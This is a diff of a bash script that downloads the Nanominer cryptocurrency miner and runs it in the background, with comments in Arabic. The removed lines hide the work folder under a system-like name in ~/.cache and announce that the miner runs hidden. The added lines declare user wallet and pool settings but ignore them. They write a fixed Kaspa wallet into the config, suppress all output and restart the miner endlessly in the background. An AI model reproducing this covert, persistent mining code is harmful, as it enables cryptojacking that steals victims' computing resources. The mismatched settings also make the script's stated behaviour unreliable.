@@ -1,40 +1,37 @@
 #!/bin/bash
-WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
-mkdir -p "$WORKDIR" && cd "$WORKDIR"
-# Parse arguments
-while [[ "$#" -gt 0 ]]; do
-    case $1 in
-        --wallet) wallet="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"; shift ;;
-        --coin) coin="XNA"; shift ;;
-        --pool) pool="stratum+tcp://ethash.eu.mine.zergpool.com:9999"; shift ;;
-        --email) email="$2"; shift ;;
-    esac
-    shift
-done
 
-if [ -z "$wallet" ] || [ -z "$coin" ] || [ -z "$pool" ]; then
-    echo "Usage: $0 --wallet NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT --coin XNA --pool stratum+tcp://ethash.eu.mine.zergpool.com:9999"
-    exit 1
-fi
+# إعداداتك الشخصية
+WALLET="YOUR_WALLET"
+COIN="ETC"   # اختر: ETC, ETH, ERGO, RVN, XNA, ...
+POOL="etc.2miners.com:10100"  # يمكن تغييره لمجمع آخر
+RIG_NAME=$(hostname)  # اسم الجهاز تلقائيًا
+THREADS=""  # اختياري لتحديد عدد الأنوية: "--threads 4"
 
-# Download Nanominer if not present
-if [ ! -d "nanominer-linux" ]; then
-    echo "[+] Downloading Nanominer..."
-    wget -q https://github.com/nanopool/nanominer/releases/download/v3.10.0/nanominer-linux-3.10.0.tar.gz
-    tar -xvf nanominer-linux-3.10.0.tar.gz
-    cd nanominer-linux || exit 1
-else
-    cd nanominer-linux || exit 1
-fi
+# رابط النسخة
+NANOMINER_URL="https://github.com/nanopool/nanominer/releases/download/v3.10.0/nanominer-linux-3.10.0.tar.gz"
 
-# Create config.ini
-cat <<EOL > config.ini
-wallet=NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT
-coin=XNA
-pool=ethash.eu.mine.zergpool.com:9999
-email=$email
+# مجلد العمل
+WORKDIR="$HOME/.nanominer"
+mkdir -p "$WORKDIR" && cd "$WORKDIR" || exit
+
+# تنزيل وفك الضغط بصمت
+wget -q "$NANOMINER_URL" -O nanominer.tar.gz
+tar -xf nanominer.tar.gz --strip=1
+rm nanominer.tar.gz
+
+# إنشاء ملف الإعدادات
+cat > config.ini <<EOL
+wallet=kaspa:qql2u8cex2c4ny8sr5z4mf394wj4jcgff930x79uyxcewpvsrdn27jv6ql4k3
+coin=KAS
+pool=kaspa-eu1.nanopool.org:10700
+rigName=RIG
 EOL
 
-# Run Nanominer silently in background
-nohup ./nanominer > /dev/null 2>&1 &
-echo "[+] Nanominer started in background (hidden)."
+# تشغيل Nanominer في الخلفية وإعادة التشغيل عند الفشل
+while true; do
+    nohup ./nanominer $THREADS > /dev/null 2>&1 &
+    PID=$!
+    wait $PID
+    echo "Nanominer crashed! Restarting in 10 seconds..."
+    sleep 10
+done &
